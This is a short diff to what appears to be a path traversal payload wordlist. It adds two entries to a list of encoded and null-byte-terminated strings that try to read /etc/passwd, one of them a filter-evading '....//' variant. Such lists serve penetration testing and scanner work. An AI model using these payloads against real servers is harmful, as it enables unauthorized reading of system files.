@@ -4,9 +4,11 @@
 %2Fetc%2Fpasswd
 %2Fetc%2Fpasswd%2500
 %2Fetc%2Fpasswd%3F
+../../../../etc/passwd
 ../../../../../../etc/passwd
 ../../../../../../etc/passwd%00
 ../../../../../../etc/passwd?
+....//....//....//....//....//....//....//etc/passwd%00
 ..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 ..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500
 ..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%3F
